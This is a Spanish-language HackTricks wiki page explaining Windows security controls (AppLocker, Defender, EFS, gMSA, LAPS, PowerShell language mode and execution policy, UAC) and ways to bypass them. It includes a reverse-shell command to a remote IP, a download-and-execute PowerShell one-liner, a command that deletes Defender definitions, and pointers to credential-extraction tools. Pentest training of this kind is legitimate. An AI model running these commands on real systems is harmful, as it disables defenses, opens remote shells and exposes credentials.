# Controles de Seguridad de Windows

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente, impulsados por las **herramientas comunitarias más avanzadas** del mundo.\
Obtén acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Política de AppLocker

Una lista blanca de aplicaciones es una lista de aplicaciones de software o ejecutables aprobados que se permiten en un sistema. El objetivo es proteger el entorno de malware dañino y software no aprobado que no se alinea con las necesidades comerciales específicas de una organización.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) es la **solución de lista blanca de aplicaciones** de Microsoft y otorga a los administradores del sistema control sobre **qué aplicaciones y archivos pueden ejecutar los usuarios**. Proporciona **control granular** sobre ejecutables, scripts, archivos de instalación de Windows, DLLs, aplicaciones empaquetadas y instaladores de aplicaciones empaquetadas.\
Es común que las organizaciones **bloqueen cmd.exe y PowerShell.exe** y el acceso de escritura a ciertos directorios, **pero todo esto se puede eludir**.

### Verificar

Verifica qué archivos/extensiones están en la lista negra/lista blanca:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Esta ruta del registro contiene las configuraciones y políticas aplicadas por AppLocker, proporcionando una forma de revisar el conjunto actual de reglas impuestas en el sistema:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

* Carpetas **escribibles** útiles para eludir la política de AppLocker: Si AppLocker permite ejecutar cualquier cosa dentro de `C:\Windows\System32` o `C:\Windows`, hay **carpetas escribibles** que puedes usar para **eludir esto**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Los binarios comúnmente **confiables** [**"LOLBAS's"**](https://lolbas-project.github.io/) también pueden ser útiles para eludir AppLocker.
* **Reglas mal escritas también podrían ser eludidas**
* Por ejemplo, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puedes crear una **carpeta llamada `allowed`** en cualquier lugar y será permitida.
* Las organizaciones también suelen centrarse en **bloquear el ejecutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, pero se olvidan de las **otras** [**ubicaciones ejecutables de PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
* **La imposición de DLL rara vez está habilitada** debido a la carga adicional que puede poner en un sistema y la cantidad de pruebas requeridas para asegurar que nada se rompa. Así que usar **DLLs como puertas traseras ayudará a eludir AppLocker**.
* Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código de Powershell** en cualquier proceso y eludir AppLocker. Para más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Almacenamiento de Credenciales

### Administrador de Cuentas de Seguridad (SAM)

Las credenciales locales están presentes en este archivo, las contraseñas están hashadas.

### Autoridad de Seguridad Local (LSA) - LSASS

Las **credenciales** (hashadas) están **guardadas** en la **memoria** de este subsistema por razones de inicio de sesión único.\
**LSA** administra la **política de seguridad** local (política de contraseñas, permisos de usuarios...), **autenticación**, **tokens de acceso**...\
LSA será quien **verifique** las credenciales proporcionadas dentro del archivo **SAM** (para un inicio de sesión local) y **hable** con el **controlador de dominio** para autenticar a un usuario de dominio.

Las **credenciales** están **guardadas** dentro del **proceso LSASS**: tickets de Kerberos, hashes NT y LM, contraseñas fácilmente descifradas.

### Secretos de LSA

LSA podría guardar en disco algunas credenciales:

* Contraseña de la cuenta de computadora del Active Directory (controlador de dominio inaccesible).
* Contraseñas de las cuentas de servicios de Windows.
* Contraseñas para tareas programadas.
* Más (contraseña de aplicaciones de IIS...)

### NTDS.dit

Es la base de datos del Active Directory. Solo está presente en Controladores de Dominio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) es un antivirus que está disponible en Windows 10 y Windows 11, y en versiones de Windows Server. **Bloquea** herramientas comunes de pentesting como **`WinPEAS`**. Sin embargo, hay formas de **eludir estas protecciones**.

### Verificar

Para verificar el **estado** de **Defender** puedes ejecutar el cmdlet de PS **`Get-MpComputerStatus`** (verifica el valor de **`RealTimeProtectionEnabled`** para saber si está activo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerarlo también podrías ejecutar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS asegura archivos a través de la encriptación, utilizando una **clave simétrica** conocida como la **Clave de Encriptación de Archivos (FEK)**. Esta clave se encripta con la **clave pública** del usuario y se almacena dentro del **flujo de datos alternativo** $EFS del archivo encriptado. Cuando se necesita la desencriptación, se utiliza la **clave privada** correspondiente del certificado digital del usuario para desencriptar la FEK del flujo $EFS. Más detalles se pueden encontrar [aquí](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

**Escenarios de desencriptación sin iniciación del usuario** incluyen:

* Cuando los archivos o carpetas se mueven a un sistema de archivos no EFS, como [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), se desencriptan automáticamente.
* Los archivos encriptados enviados a través de la red mediante el protocolo SMB/CIFS se desencriptan antes de la transmisión.

Este método de encriptación permite **acceso transparente** a los archivos encriptados para el propietario. Sin embargo, simplemente cambiar la contraseña del propietario e iniciar sesión no permitirá la desencriptación.

**Puntos Clave**:

* EFS utiliza una FEK simétrica, encriptada con la clave pública del usuario.
* La desencriptación emplea la clave privada del usuario para acceder a la FEK.
* La desencriptación automática ocurre bajo condiciones específicas, como copiar a FAT32 o transmisión por red.
* Los archivos encriptados son accesibles para el propietario sin pasos adicionales.

### Verificar información de EFS

Verifique si un **usuario** ha **utilizado** este **servicio** comprobando si existe esta ruta: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Verifique **quién** tiene **acceso** al archivo usando cipher /c \<file>\
También puede usar `cipher /e` y `cipher /d` dentro de una carpeta para **encriptar** y **desencriptar** todos los archivos

### Desencriptando archivos EFS

#### Siendo Autoridad del Sistema

Este método requiere que el **usuario víctima** esté **ejecutando** un **proceso** dentro del host. Si ese es el caso, usando sesiones de `meterpreter` puedes suplantar el token del proceso del usuario (`impersonate_token` de `incognito`). O simplemente podrías `migrate` al proceso del usuario.

#### Conociendo la contraseña del usuario

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

Microsoft desarrolló **Group Managed Service Accounts (gMSA)** para simplificar la gestión de cuentas de servicio en infraestructuras de TI. A diferencia de las cuentas de servicio tradicionales que a menudo tienen habilitada la configuración de "**La contraseña nunca expira**", los gMSA ofrecen una solución más segura y manejable:

* **Gestión Automática de Contraseñas**: los gMSA utilizan una contraseña compleja de 240 caracteres que cambia automáticamente de acuerdo con la política del dominio o computadora. Este proceso es manejado por el Servicio de Distribución de Claves (KDC) de Microsoft, eliminando la necesidad de actualizaciones manuales de contraseñas.
* **Seguridad Mejorada**: estas cuentas son inmunes a bloqueos y no pueden ser utilizadas para inicios de sesión interactivos, mejorando su seguridad.
* **Soporte para Múltiples Hosts**: los gMSA pueden ser compartidos entre múltiples hosts, lo que los hace ideales para servicios que se ejecutan en múltiples servidores.
* **Capacidad de Tareas Programadas**: a diferencia de las cuentas de servicio administradas, los gMSA admiten la ejecución de tareas programadas.
* **Gestión Simplificada de SPN**: el sistema actualiza automáticamente el Nombre Principal del Servicio (SPN) cuando hay cambios en los detalles de sAMaccount de la computadora o en el nombre DNS, simplificando la gestión de SPN.

Las contraseñas para los gMSA se almacenan en la propiedad LDAP _**msDS-ManagedPassword**_ y se restablecen automáticamente cada 30 días por los Controladores de Dominio (DC). Esta contraseña, un blob de datos encriptados conocido como [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), solo puede ser recuperada por administradores autorizados y los servidores en los que están instalados los gMSA, asegurando un entorno seguro. Para acceder a esta información, se requiere una conexión segura como LDAPS, o la conexión debe estar autenticada con 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Puedes leer esta contraseña con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Encuentra más información en esta publicación**](https://cube0x0.github.io/Relaying-for-gMSA/)

También, consulta esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre cómo realizar un **ataque de retransmisión NTLM** para **leer** la **contraseña** de **gMSA**.

## LAPS

La **Solución de Contraseña de Administrador Local (LAPS)**, disponible para descargar desde [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permite la gestión de contraseñas de Administrador local. Estas contraseñas, que son **aleatorias**, únicas y **cambiadas regularmente**, se almacenan de forma central en Active Directory. El acceso a estas contraseñas está restringido a través de ACLs a usuarios autorizados. Con los permisos suficientes otorgados, se proporciona la capacidad de leer contraseñas de administrador local.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## Modo de Lenguaje Restringido de PS

PowerShell [**Modo de Lenguaje Restringido**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **bloquea muchas de las características** necesarias para usar PowerShell de manera efectiva, como bloquear objetos COM, permitiendo solo tipos .NET aprobados, flujos de trabajo basados en XAML, clases de PowerShell, y más.

### **Verificar**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```powershell
#Easy bypass
Powershell -version 2
```
En Windows actual, ese bypass no funcionará, pero puedes usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilarlo, es posible que necesites** **_Agregar una referencia_** -> _Examinar_ -> _Examinar_ -> agregar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` y **cambiar el proyecto a .Net4.5**.

#### Bypass directo:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Shell inversa:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código de Powershell** en cualquier proceso y eludir el modo restringido. Para más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Política de Ejecución de PS

Por defecto, está configurada como **restringida.** Principales formas de eludir esta política:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interfaz de Proveedor de Soporte de Seguridad (SSPI)

Es la API que se puede usar para autenticar usuarios.

El SSPI se encargará de encontrar el protocolo adecuado para dos máquinas que desean comunicarse. El método preferido para esto es Kerberos. Luego, el SSPI negociará qué protocolo de autenticación se utilizará, estos protocolos de autenticación se llaman Proveedor de Soporte de Seguridad (SSP), se encuentran dentro de cada máquina Windows en forma de un DLL y ambas máquinas deben soportar el mismo para poder comunicarse.

### Principales SSPs

* **Kerberos**: El preferido
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** y **NTLMv2**: Razones de compatibilidad
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Servidores web y LDAP, contraseña en forma de un hash MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL y TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Se utiliza para negociar el protocolo a usar (Kerberos o NTLM siendo Kerberos el predeterminado)
* %windir%\Windows\System32\lsasrv.dll

#### La negociación podría ofrecer varios métodos o solo uno.

## UAC - Control de Cuentas de Usuario

[Control de Cuentas de Usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que habilita un **mensaje de consentimiento para actividades elevadas**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente impulsados por las **herramientas más avanzadas** de la comunidad.\
Obtén acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
